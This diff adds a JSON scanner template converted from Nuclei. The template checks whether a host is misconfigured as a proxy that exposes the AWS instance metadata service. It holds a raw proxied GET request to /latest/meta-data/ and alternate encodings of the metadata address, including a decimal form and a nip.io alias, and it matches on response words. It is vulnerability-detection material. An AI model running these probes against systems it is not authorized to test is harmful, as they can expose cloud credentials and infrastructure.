@@ -1,0 +1,153 @@
+{
+  "id": "metadata-service-aws",
+  "name": "Amazon AWS Metadata Service Check",
+  "author": "sullo,DhiyaneshDk",
+  "severity": "CRITICAL",
+  "description": "The host is configured as a proxy which allows access to the metadata provided by a cloud provider such as AWS or OVH. This could allow significant access to the host/infrastructure.",
+  "references": [
+    "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html",
+    "https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/",
+    "https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/",
+    "https://twitter.com/Random_Robbie/status/1268186743657947137",
+    "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#"
+  ],
+  "tags": [
+    "exposure",
+    "proxy",
+    "aws",
+    "amazon",
+    "misconfig",
+    "metadata"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {},
+  "variables": {
+    "hostval": [
+      "aws.oast.online",
+      "169.254.169.254",
+      2852039166,
+      "169.254.169.254.nip.io"
+    ]
+  },
+  "variablesType": "sniper",
+  "cweId": "CWE-441",
+  "cvssScore": "9.3",
+  "cvssMetrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET http://{{hostval}}/latest/meta-data/ HTTP/1.1\nHost: {{hostval}}\n\n"
+      ],
+      "unsafe": true,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "WORD",
+          "part": "body",
+          "values": [
+            "public-ipv4",
+            "privateIp"
+          ],
+          "negative": false,
+          "condition": "OR",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "metadata-service-aws",
+    "info": {
+      "name": "Amazon AWS Metadata Service Check",
+      "author": "sullo,DhiyaneshDk",
+      "severity": "critical",
+      "description": "The host is configured as a proxy which allows access to the metadata provided by a cloud provider such as AWS or OVH. This could allow significant access to the host/infrastructure.",
+      "reference": [
+        "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html",
+        "https://blog.projectdiscovery.io/abusing-reverse-proxies-metadata/",
+        "https://www.mcafee.com/blogs/enterprise/cloud-security/how-an-attacker-could-use-instance-metadata-to-breach-your-app-in-aws/",
+        "https://twitter.com/Random_Robbie/status/1268186743657947137",
+        "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#"
+      ],
+      "classification": {
+        "cvss_metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N",
+        "cvss_score": "9.3",
+        "cwe_id": "CWE-441"
+      },
+      "metadata": {
+        "max_request": 4
+      },
+      "tags": "exposure,proxy,aws,amazon,misconfig,metadata"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "payloads": {
+          "hostval": [
+            "aws.oast.online",
+            "169.254.169.254",
+            2852039166,
+            "169.254.169.254.nip.io"
+          ]
+        },
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": true,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET http://{{hostval}}/latest/meta-data/ HTTP/1.1\nHost: {{hostval}}\n\n"
+        ],
+        "matchers": [
+          {
+            "type": "word",
+            "negative": false,
+            "part": "body",
+            "words": [
+              "public-ipv4",
+              "privateIp"
+            ],
+            "condition": "or",
+            "case_insensitive": false
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
